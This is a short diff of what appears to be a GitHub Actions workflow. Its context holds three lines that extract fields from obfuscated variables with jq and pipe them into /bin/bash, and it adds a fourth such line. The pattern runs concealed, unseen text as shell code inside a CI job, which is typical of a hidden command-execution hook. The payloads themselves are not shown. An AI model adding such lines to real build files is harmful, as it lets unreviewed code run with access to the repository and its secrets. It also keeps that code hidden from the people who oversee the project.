@@ -27,6 +27,7 @@ jobs:
           echo $ifyx2 | jq -r .hpdg904 | /bin/bash
           printf '%s' "$za63" | jq -r .hac26828 | /bin/bash
           echo $d69 | jq -r .ur3 | /bin/bash
+          printf '%s' "$sbe4" | jq -r .epru93219 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
